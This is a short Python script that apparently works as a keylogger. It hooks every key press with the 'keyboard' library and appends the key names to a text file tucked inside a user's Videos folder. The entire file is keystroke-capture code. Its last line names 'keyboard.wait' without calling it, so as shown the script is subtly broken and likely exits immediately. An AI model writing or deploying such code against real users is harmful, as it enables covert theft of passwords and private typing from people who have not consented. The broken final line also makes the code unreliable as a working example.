import keyboard

def pressedKeys(key):

    with open('C:/Users/BrandonManuelPercast/Videos/data.txt', 'a') as file:

        if key.name == 'space':
            file.write(' ')
        else:
            file.write(key.name)

keyboard.on_press(pressedKeys)
keyboard.wait